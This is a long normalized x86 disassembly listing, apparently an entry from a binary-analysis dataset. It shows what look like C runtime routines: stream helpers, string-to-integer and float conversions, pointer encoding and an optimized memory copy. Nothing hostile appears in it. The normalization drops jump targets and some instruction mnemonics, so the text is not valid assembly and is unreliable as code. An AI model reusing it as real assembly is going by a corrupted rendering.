mov eax 0xffff
mov ecx esi
call sub_436787
cmp [ esi + 0x44 ] ebx
jne r-xdata
dec [ eax ]
mov esi [ esi + 0x24 ]
mov eax [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov [ eax ] di
mov ax di
jmp r-xdata
movzx eax di
push ebx
push 0x8
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_41ed20
mov [ ebp - 0x4 ] ebx
push [ esi + 0x54 ]
push edi
call sub_436812
pop ecx
test al al
pop ecx
movzx eax di
jne r-xdata
mov edx [ ebp - 0x2c ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov edx eax
jmp r-xdata
add eax [ ebp - 0x1c ]
mov ecx [ esi + 0x44 ]
mov edi [ ecx ]
lea ebx [ ebp - 0x34 ]
push ebx
push eax
push edx
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x2e ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ esi + 0x4c ]
push eax
call [ edi + 0x14 ]
xor ebx ebx
inc ebx
test eax eax
js r-xdata
push 0x0
lea ecx [ ebp - 0x2c ]
cmp eax ebx
jg r-xdata
cmp eax 0x3
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push [ esi + 0x54 ]
push [ ebp - 0x30 ]
call sub_436812
movzx esi [ ebp + 0x8 ]
pop ecx
pop ecx
test al al
jne r-xdata
mov edi [ ebp - 0x34 ]
sub edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_405da0
mov ax si
jmp r-xdata
mov esi 0xffff
lea eax [ ebp - 0x30 ]
mov [ esi + 0x4a ] bl
cmp [ ebp - 0x38 ] eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_405da0
mov ax [ ebp + 0x8 ]
jmp r-xdata
test edi edi
jne r-xdata
push [ esi + 0x54 ]
push edi
push ebx
push eax
call sub_43bb9f
add esp 0x10
cmp edi eax
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x1c ] 0x20
push edi
lea ecx [ ebp - 0x2c ]
jae r-xdata
push ebx
call sub_405da0
push 0x8
call sub_409a90
jmp r-xdata
sub_43727d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
push edi
lea ecx [ esi + 0x48 ]
xor edi edi
cmp [ eax ] ecx
jne r-xdata
cmp [ esi + 0x54 ] edi
je r-xdata
cmp [ ebp + 0x14 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov ecx [ r--data ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] edi
mov ecx esi
call sub_436fe1
test al al
je r-xdata
cmp [ esi + 0x44 ] edi
jne r-xdata
mov eax [ ebp + 0xc ]
or eax [ ebp + 0x10 ]
jne r-xdata
add [ ebp + 0xc ] 0xfffffffe
adc [ ebp + 0x10 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esi + 0x54 ]
call sub_43ebdc
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] 0x1
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ esi + 0x54 ]
call sub_43eae5
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx esi
call sub_436787
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ esi + 0x4c ]
mov [ eax ] edi
mov [ eax + 0x4 ] edi
mov [ eax + 0x10 ] ecx
jmp r-xdata
pop edi
pop esi
leave
retn 0x14
sub_437335
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi ecx
cmp [ esi + 0x54 ] 0x0
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov ecx [ r--data ]
mov [ eax + 0x4 ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
call sub_436fe1
test al al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ esi + 0x54 ]
call sub_43ec5b
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax edi
or eax ebx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ esi + 0x54 ]
call sub_43eae5
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x1
push ebx
push edi
push [ esi + 0x54 ]
call sub_43ebdc
add esp 0x10
test eax eax
jne r-xdata
mov eax [ ebp + 0x1c ]
mov ecx esi
mov [ esi + 0x4c ] eax
call sub_436787
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ esi + 0x4c ]
jmp r-xdata
pop edi
pop esi
mov [ eax + 0x10 ] ecx
pop ebx
leave
retn 0x20
sub_4373ed
mov edi edi
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov edi esi
cmp [ esi + 0x54 ] ebx
je r-xdata
xor edi edi
call sub_436fe1
test al al
jne r-xdata
push [ esi + 0x54 ]
call sub_438a5b
pop ecx
test eax eax
je r-xdata
xor edi edi
mov ecx esi
mov [ esi + 0x50 ] bl
mov [ esi + 0x4a ] bl
call sub_4049c0
mov [ esi + 0x54 ] ebx
mov eax [ rw-data ]
mov [ esi + 0x4c ] eax
mov eax edi
pop edi
mov [ esi + 0x44 ] ebx
pop esi
pop ebx
retn
sub_437438
push 0x4
mov eax sub_450fbb
call sub_43cccf
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x54 ] 0x0
je r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
call sub_436787
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_4036e0
call sub_43cd6e
retn
mov ecx esi
call sub_4373ed
sub_43747c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_437438
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
pop ecx
sub_4374cf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_43c803
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_43c7dd
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
sub eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_43df03
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x2
je r-xdata
push ebx
call sub_43ae95
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x200
push [ ebp - 0xc ]
push 0x0
call sub_43e133
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_4375e1
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_43b019
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x7fffffff
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_43797a
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp eax esi
ja r-xdata
call sub_43c04c
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp eax 0x80000000
jbe r-xdata
xor eax eax
cmp [ ebp + 0xf ] 0x2d
sete al
add eax esi
jmp r-xdata
mov [ eax ] 0x1
neg eax
sub_437686
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_437b16
fstp [ ebp - 0x4 ]
fld [ ebp - 0x4 ]
add esp 0x10
leave
retn
sub_4376a8
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_43b019
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x80000000
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
mov ecx eax
or ecx edx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_43776b
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_43c04c
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp edx esi
jb r-xdata
jb r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
mov [ eax ] 0x1
neg eax
adc edx 0x0
neg edx
ja r-xdata
cmp eax 0xffffffff
ja r-xdata
or eax 0xffffffff
mov edx 0x7fffffff
jmp r-xdata
xor eax eax
mov edx esi
jmp r-xdata
test eax eax
je r-xdata
sub_43776b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x28
push ebx
push esi
xor esi esi
push edi
cmp eax esi
je r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov edi ebx
jmp r-xdata
mov [ eax ] esi
push eax
call sub_43b019
pop ecx
test eax eax
jne r-xdata
inc edi
movzx eax [ edi ]
mov al [ edi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc edi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax esi
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
xor edx edx
mov [ eax ] ebx
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax esi
jl r-xdata
mov cl 0x30
cmp eax esi
jle r-xdata
cmp [ edi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
cmp [ edi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ edi ] cl
je r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc edi
movsx eax [ edi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2 ] 0x0
call sub_43edab
pop ecx
push eax
mov esi r--data
push esi
call sub_438bc0
mov ecx eax
add esp 0xc
test ecx ecx
je r-xdata
add edi 0x2
cmp al 0x58
jne r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
mov eax [ ebp + 0x10 ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov ebx [ ebp + 0x10 ]
movsx ecx [ ebx + r--data ]
mov eax edi
sub eax ecx
sub eax [ ebp - 0x10 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jmp r-xdata
push [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
push [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x28 ]
mov bl cl
mov eax esi
sub bl al
mov [ ebp - 0x2 ] bl
call sub_43ee50
push [ ebp + 0x10 ]
mov ecx eax
movsx eax bl
mov [ ebp - 0x8 ] edx
cdq
add ecx eax
mov eax [ ebp - 0x8 ]
adc eax edx
mov [ ebp - 0x14 ] eax
inc edi
movsx eax [ edi ]
push eax
mov [ ebp - 0x18 ] ecx
call sub_43edab
pop ecx
push eax
push esi
call sub_438bc0
mov ecx eax
add esp 0xc
test ecx ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
call sub_43c04c
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
movsx eax [ ebp - 0x2 ]
mov esi [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
cdq
sub esi eax
sbb ecx edx
cmp [ ebp - 0x14 ] ecx
jb r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
jmp r-xdata
mov [ eax ] edi
or [ ebp - 0x18 ] 0xffffffff
or [ ebp - 0x14 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
ja r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
cdq
push edx
push eax
push ecx
push esi
call sub_43ede0
cmp eax [ ebp - 0x20 ]
jne r-xdata
cmp [ ebp - 0x18 ] esi
jb r-xdata
cmp edx [ ebp - 0x1c ]
je r-xdata
sub_43797a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x14
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
mov edi [ ebp + 0x8 ]
movzx eax [ edi ]
mov esi edi
jmp r-xdata
mov [ eax ] ebx
push eax
call sub_43b019
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc esi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
je r-xdata
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jl r-xdata
mov cl 0x30
cmp eax ebx
jle r-xdata
cmp [ esi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
cmp [ esi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ esi ] cl
je r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc esi
movsx eax [ esi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ebx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] ebx
call sub_43edab
pop ecx
push eax
mov edi r--data
push edi
call sub_438bc0
add esp 0xc
cmp eax ebx
je r-xdata
add esi 0x2
cmp al 0x58
jne r-xdata
mov bl [ ebp + 0x13 ]
mov ecx [ ebp - 0x8 ]
push [ ebp + 0x10 ]
mov bl al
mov eax edi
sub bl al
mov eax ecx
imul eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
movsx ecx bl
add eax ecx
mov [ ebp - 0x8 ] eax
inc esi
movsx eax [ esi ]
push eax
call sub_43edab
pop ecx
push eax
push edi
call sub_438bc0
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp + 0x10 ]
movsx edx [ ecx + r--data ]
mov eax esi
sub eax edx
sub eax [ ebp - 0x14 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
cmp [ ebp - 0x10 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
neg [ ebp - 0x8 ]
call sub_43c04c
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
movsx edx bl
sub eax edx
cmp [ ebp - 0x8 ] eax
jb r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov [ eax ] esi
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
xor edx edx
div ecx
cmp eax [ ebp - 0xc ]
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_437b16
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_43c04c
mov esi [ eax ]
call sub_43c04c
push [ ebp + 0xc ]
and [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_43efa7
fstp [ ebp - 0x8 ]
pop ecx
pop ecx
call sub_43c04c
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
call sub_43c04c
fld [ r--data ]
mov [ eax ] esi
mov eax [ ebp + 0x10 ]
pop esi
jmp r-xdata
test eax eax
jg r-xdata
fld [ ebp - 0x8 ]
dec eax
fmul st1
fstp [ ebp - 0x8 ]
jns r-xdata
fstp st0
fld [ ebp - 0x8 ]
leave
retn
neg eax
dec eax
fld [ ebp - 0x8 ]
fdiv st1
fstp [ ebp - 0x8 ]
jne r-xdata
sub_437b7f
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
dec [ rw-data ]
call [ EncodePointer@IAT ]
mov ecx [ rw-data ]
mov [ ecx * 4 + rw-data ] eax
pop ebp
retn
pop ebp
jmp sub_43efbe
sub_437c55
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_43c860
lea esi [ eax + 0x1 ]
push esi
call sub_438337
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_43f118
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_437cb3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_437c55
mov eax esi
pop esi
pop ebp
retn 0x4
sub_437cda
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_437c95
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_437c55
jmp r-xdata
sub_437d0f
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_437cb3
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_437d38
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_437c95
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
pop ecx
sub_437d5f
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_437cda
mov eax esi
pop esi
pop ebp
retn 0x4
sub_437db0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_437e34 ]
jmp [ ecx * 4 + jump_table_437eb4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_437f20 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_4380bc ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_437fc0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4380bc ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_437f20 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4380bc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_437f20 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_437f20 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_437f20 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4380bc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4380bc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4380bc ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
